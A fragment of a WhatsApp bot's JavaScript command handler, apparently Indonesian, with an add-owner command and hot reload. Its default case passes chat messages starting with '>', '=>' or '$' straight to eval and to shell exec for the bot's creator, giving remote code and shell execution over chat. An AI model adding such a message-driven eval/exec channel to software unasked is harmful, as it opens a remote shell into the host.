if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================


default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (m.text.toLowerCase() == "dis") {
m.reply("Opo")
}

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
xyu.sendMessage(global.owner + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});